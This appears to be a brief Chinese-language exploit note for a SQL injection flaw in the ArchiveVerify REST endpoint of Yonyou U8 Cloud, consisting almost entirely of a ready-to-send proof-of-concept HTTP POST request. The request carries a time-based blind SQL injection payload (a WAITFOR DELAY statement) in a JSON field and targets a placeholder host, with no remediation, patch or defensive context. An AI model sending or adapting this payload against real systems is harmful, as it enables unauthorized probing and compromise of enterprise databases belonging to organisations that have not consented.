## 用友U8 Cloud-ArchiveVerify存在SQL注入漏洞


## poc
```
POST /u8cuapws/rest/archive/verify HTTP/1.1
Host: your-ip
User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Content-Type: application/x-www-form-urlencoded
 
{"orgInfo":{"code":"1';WAITFOR DELAY '0:0:5'--"}}
```
